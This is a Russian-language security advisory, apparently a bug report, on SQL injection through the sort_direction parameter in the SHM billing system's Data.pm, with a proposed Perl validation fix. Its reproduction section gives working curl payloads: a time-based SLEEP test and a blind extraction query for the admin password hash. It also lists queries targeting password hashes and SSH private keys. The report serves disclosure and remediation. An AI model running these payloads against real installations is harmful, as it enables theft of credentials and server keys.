# SQL Injection в параметре sort_direction

## Суть

Параметр `sort_direction` подставляется напрямую в SQL-запрос без валидации. Это позволяет любому авторизованному пользователю (не админу) выполнять произвольные SQL-запросы и читать всю базу данных: пароли, платежи, SSH-ключи, конфиги.

## Где проблема

Файл `app/lib/Core/Sql/Data.pm`, строка ~903:

```perl
$query .= join(',', map( "`".$args{order}->[$_*2]."` ".$args{order}->[$_*2+1],
                        0..scalar(@{ $args{order} })/2-1) );
```

Поле `sort_field` валидируется через `structure` (безопасно). Но `sort_direction` (нечётные элементы массива `order`) подставляется как есть — без проверки что это `asc` или `desc`.

## Как воспроизвести

Нужен любой авторизованный пользователь с хотя бы одной услугой.

### Шаг 1. Создать пользователя

```bash
curl -s -X PUT 'https://YOUR-SHM/shm/v1/user' \
  -d 'login=testuser&password=testpass'
```

### Шаг 2. Назначить ему любую услугу (из админки)

### Шаг 3. Проверить — нормальный запрос

```bash
time curl -s -u 'testuser:testpass' \
  'https://YOUR-SHM/shm/v1/user/service?sort_field=user_service_id&sort_direction=asc'
```

Ответ ~0.2 секунды.

### Шаг 4. Проверить — SQL injection с SLEEP(3)

```bash
time curl -s -u 'testuser:testpass' \
  'https://YOUR-SHM/shm/v1/user/service?sort_field=user_service_id&sort_direction=asc,(SELECT+SLEEP(3))'
```

Ответ ~3.2 секунды. SLEEP(3) выполнился в MySQL — это доказывает что произвольный SQL принимается.

### Шаг 5. Извлечение данных (proof-of-concept)

Проверяем первый символ хеша пароля первого админа:

```bash
# Проверяем: первый символ = '0'?
time curl -s -u 'testuser:testpass' \
  'https://YOUR-SHM/shm/v1/user/service?sort_field=user_service_id&sort_direction=asc,IF(SUBSTRING((SELECT+password+FROM+users+WHERE+gid%3D1+LIMIT+1),1,1)=%270%27,SLEEP(3),0)'
```

Если ответ ~3с — символ угадан. Если ~0.2с — не угадан. Перебирая символы 0-9, a-f, атакующий извлекает полный SHA1-хеш за ~640 запросов (~30 минут).

## Что может извлечь атакующий

Любые данные из любой таблицы MySQL:

- `SELECT login, password FROM users` — все логины и хеши паролей
- `SELECT private_key FROM identities` — SSH приватные ключи серверов
- `SELECT host, settings FROM servers` — адреса и настройки серверов
- `SELECT data FROM templates` — шаблоны (могут содержать API-токены)
- `SELECT * FROM configs` — конфигурация биллинга
- `SELECT * FROM pays` — история платежей

## Кто может эксплуатировать

Любой зарегистрированный пользователь с хотя бы одной услугой. Регистрация открыта через API (`PUT /user`), услугу можно получить через заказ.

Уязвимость работает через user-эндпоинты (`/user/service`), admin-доступ не нужен.

## Предложенный фикс

В функции `query_for_order` (Data.pm) добавить проверку:

```perl
sub query_for_order {
    my $self = shift;
    my %args = (
        sort_field => undef,
        sort_direction => 'desc',
        @_,
    );

    return undef unless $self->can('structure');
    my %structure = %{ $self->structure };

    my $field = exists $structure{ $args{sort_field} } ? $args{sort_field} : $self->get_table_key;
    return undef unless $field;

    # FIX: валидация sort_direction
    my $direction = lc($args{sort_direction} // 'desc');
    $direction = 'desc' unless $direction =~ /^(asc|desc)$/;

    return [ $field => $direction ];
}
```

Это 2 строки кода. После фикса любое значение кроме `asc`/`desc` будет заменено на `desc`.

## Severity

**CRITICAL** — полный доступ к базе данных для любого авторизованного пользователя.

## Затронутые версии

Проверено на 2.7.2. Уязвимость присутствует во всех версиях где `sort_direction` не валидируется в `query_for_order`.
